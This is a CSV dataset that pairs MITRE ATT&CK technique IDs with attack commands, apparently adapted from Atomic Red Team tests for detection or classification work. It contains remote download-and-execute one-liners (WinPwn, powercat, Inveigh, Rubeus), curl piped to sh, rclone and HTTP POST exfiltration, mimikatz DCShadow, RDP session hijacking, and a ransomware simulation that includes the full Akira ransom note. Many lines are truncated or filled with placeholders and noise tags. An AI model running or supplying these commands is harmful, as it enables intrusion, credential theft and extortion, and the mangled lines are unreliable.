mitre_id,command
T1574,"c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe \out:""$env:localappdata\microsoft\windowsapps\get-variable.exe"" ""pathtoatomicsfolder\t1574.008\bin\calc.cs"" powershell -noprofile"
T1222,chown #{owner} #{file_or_folder}> /dev/null 2>&1 # id_65
T1140,copy %windir%\system32\certutil.exe %temp%\tcm.tmp %temp%\tcm.tmp -encode #{executable} %temp%\t1140_calc2.txt %temp%\tcm.tmp -decode %temp%\t1140_calc2.txt %temp%\t1140_calc2_decoded.exe
T1496,yes > \dev\null# run_1560
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_61"
T1571,echo quit | telnet var_32677 exit 0
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}> /dev/null 2>&1 # id_83
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_725"")"
T1114,"powershell  -executionpolicy  bypass  -command  ""var_37166"
T1572,var_656 &
T1552,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.credential-access.ec2-get-password-data echo ""starting detonate"" ./stratus detonate aws.credential-access.ec2-get-password-data --force"
T1078,net user var_3989 \active:yes
T1021,new-psdrive -name var_158
T1614,curl -k #{ip_lookup_url}> /dev/null 2>&1 # id_29
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_568"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_706
T1558,"cmd.exe  \c  ""var_878"""
T1124,"reg query ""hklm\system\currentcontrolset\control\timezoneinformation"" /v timezonekeyname# run_2800"
T1222,chown -r var_522
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_583"""
T1078,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') obfuskittiedump -consoleoutput -noninteractive> /dev/null 2>&1 # id_39
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_36258 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1486,"1..100 | foreach-object { $out = new-object byte[] 1073741; (new-object random).nextbytes($out); [io.file]::writeallbytes(""c:\test.$_.akira"", $out) } echo ""hi friends"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. moreover, we have taken a great amount of your corporate data prior to encryption well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. we're fully aware of what damage we caused by locking your internal sources. at the moment. you have to know: "" >> $env:userprofile\desktop\akira_readme.txt echo ""1. dealing with us you will save a lot due to we are not interested in ruining your financially. we will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. if you have an active cyber insurance, let us know and we will guide you how to properly use it. also, dragging out the negotiation process will lead to failing of a deal"" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paying us you save your time, money, efforts and be back on track within 24 hours approximately. our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:userprofile\desktop\akira_readme.txt echo ""3. the security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since no full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:userprofile\desktop\akira_readme.txt echo ""4. as for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:userprofile\desktop\akira_readme.txt echo ""then all of this will be published in our blog -"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""5. we're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""if you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""1. install tor browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paste this link - https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo ""3. use this code - - to log into our chat."" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:userprofile\desktop\akira_readme.txt"
T1030,$file = [system.io.file]::openread(var_39466 $file.close()
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_204"""
T1098,"aws iam create-access-key --user-name var_946 > ""$pathtoatomicsfolder\t1098.001\bin\aws_secret.creds"" cd ""$pathtoatomicsfolder\t1098.001\bin\"" .\aws_secret.sh"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_752"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1530,"$storage_account_objects  =  import-csv  -path  ""var_170"
T1567,"write-host  ""deploying  aws  infrastructure...  ""  -nonewline  $awsaccesskey  =  ""var_25913  ""@  $config  |  out-file  -filepath  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  -encoding  ascii  write-host  ""done!""  write-host  ""exfiltrating  data...  ""  -nonewline  $bucket  =  ""$(pathtoatomicsfolder\..\externalpayloads\t1567.002\terraform-v*\terraform  output  bucket)"".replace(""`"""","""")  cd  pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone-v*  $null  =  .\rclone  copy  --max-size  1700k  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\data\""  exfils3:$bucket  --config  ""pathtoatomicsfolder\..\externalpayloads\t1567.002\rclone.conf""  write-host  ""done!"""
T1005,cd $home curl -o var_13752; fi' \;
T1041,if(-not (test-path var_607 -method post -body $filecontent -disablekeepalive
T1573,$server_ip = var_36044
T1552,$cert = new-selfsignedcertificate -dnsname atomicredteam.com -certstorelocation cert:\localmachine\my set-location cert:\localmachine\my export-certificate -type cert -cert cert:\localmachine\my\$($cert.thumbprint) -filepath #{pfx_path}
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)> /dev/null 2>&1 # id_85
T1071,var_801 >nul 2>&1
T1057,ps >> var_14883
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_3905"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1078,gcloud config set project var_60215
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)# run_1031
T1095,iex  (new-object  system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\besimorhino\powercat\ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5\powercat.ps1')  powercat  -c  var_80781
T1018,"""var_673"
T1543,"stop-service -name ""var_973"" -erroraction silentlycontinue | out-null"
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_44"
T1087,get-adcomputer #{hostname} -properties *
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh# run_5830
T1071,var_469
T1007,tasklist.exe /svc sc query sc query state= all> /dev/null 2>&1 # id_40
T1055,$pathtoatomicsfolder\t1055\bin\x64\uuidfromstringa.exe -debug
T1578,az snapshot create --resource-group var_961 --location eastus
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_21228"" net start sesshijack"
T1113,screencapture var_491
T1496,yes  >  \dev\null> /dev/null 2>&1 # id_69
T1197,bitsadmin.exe \transfer \download \priority foreground var_895
T1125,reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestart  \t  reg_binary  \d  a273b6f07104d601  \f  reg  add  hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe  \v  lastusedtimestop  \t  reg_binary  \d  96ef514b7204d601  \f> /dev/null 2>&1 # id_90
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f> /dev/null 2>&1 # id_29
T1609,kubectl  create  -f  var_93006
T1070,"get-childitem ""#{file_path}"" | % { $_.creationtime = ""#{target_date_time}"" }"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y# run_5321"
T1074,curl -s https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.sh | sh -s > var_337
T1020,"$sampledata  =  ""sample  data  for  exfiltration  test""  set-content  -path  ""var_181""  -credential  $creds"
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_323 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1217,get-childitem -path c:\users\ -filter bookmarks -recurse -erroraction silentlycontinue -force# run_9185
T1095,"cmd  \c  ""var_689"
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached> /dev/null 2>&1 # id_72"
T1072,"""%programfiles(x86)%\var_49448"""
T1140,"encoded=$(python3 -c 'import base64;enc=base64.b64encode(""var_137').read());print(dec.decode())"""
T1529,"echo """" | ""var_87424'`; do vim-cmd vmsvc\power.off $i & done"""
T1014,sudo modprobe var_417
T1098,"$x = get-random -minimum 2 -maximum 99 $y = get-random -minimum 2 -maximum 99 $z = get-random -minimum 2 -maximum 99 $w = get-random -minimum 2 -maximum 99 import-module activedirectory $account = ""var_622"" $account"
T1048,$content = get-content #{input_file} invoke-webrequest -uri #{ip_address} -method post -body $content
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 4> /dev/null 2>&1 # id_61"
T1489,sudo killall -sigterm var_117
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_445"
T1176,"#  chromium  $chromium  =  ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip""  #  ublock  origin  lite  to  test  side-loading  $extension  =  ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip""  set-location  ""var_829\extension\""  -passthru"
T1558,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""asreproast /format:hashcat /nowrap""> /dev/null 2>&1 # id_40"
T1014,sudo  insmod  var_97394.ko
T1652,kextstat> /dev/null 2>&1 # id_55
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_2871"
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive> /dev/null 2>&1 # id_36
T1564,"xattr -lr * / 2>&1 /dev/null | grep -c 2 ""00 00 00 00 00 00 00 00 40 00 ff ff ff ff 00 00"""
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
